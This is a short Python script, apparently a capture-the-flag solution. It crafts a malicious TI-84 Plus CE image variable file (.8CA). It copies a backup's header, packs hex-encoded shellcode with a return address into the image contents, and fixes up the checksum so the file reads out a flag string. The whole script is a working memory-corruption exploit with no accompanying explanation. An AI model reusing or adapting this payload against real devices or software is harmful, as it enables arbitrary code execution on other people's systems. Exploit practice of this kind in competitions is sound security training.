import struct

# rawdataaddr is where raw_data lands
rawdataaddr = 0xD03202

# straddr is where the flag lands
straddr = 0xd2a8b0

with open("./01 BRIDGE_IMAGE1.8CA.bak", "rb") as initial:
	bak = initial.read()

header_data = struct.unpack("<8s3s42sH", bak[:55])
obj = struct.unpack("<HHB8sBBH", bak[55:55+17])

def make_var_file(data):
	checksum = 0
	for b in data:
		checksum += b
	checksum &= 0xffff

	header = struct.pack("<8s3s42sH",
		header_data[0],
		header_data[1],
		header_data[2],
		len(data))
	checksum = struct.pack("<H", checksum)
	return header + data + checksum

def make_img_data(name, contents):
	header = struct.pack("<HHB8sBBH",
		obj[0],
		len(contents),
		obj[2],
		name,
		obj[4],
		obj[5],
		len(contents))
	return header + contents


shellcode = b"\x01" + straddr.to_bytes(3, "little") + bytes.fromhex("c5cd301d02c1cd3c1d02b728f901000000c5cd70aad1c1c9100f0e")
runner = (rawdataaddr + 5).to_bytes(3, "little") + shellcode

# L is for padding out to 3 bytes, this will be brute forced likely
data = runner + b"L" + (rawdataaddr + 2).to_bytes(3, "little") * 4

payload = b""
# "<" name is Img1 (???). the first two bytes of the contents is the buffer size they want
payload += make_img_data(b"<",
	struct.pack("<H", len(runner)) + data)

with open("01 BRIDGE_IMAGE1.8CA", "wb") as f:
	f.write(make_var_file(payload))


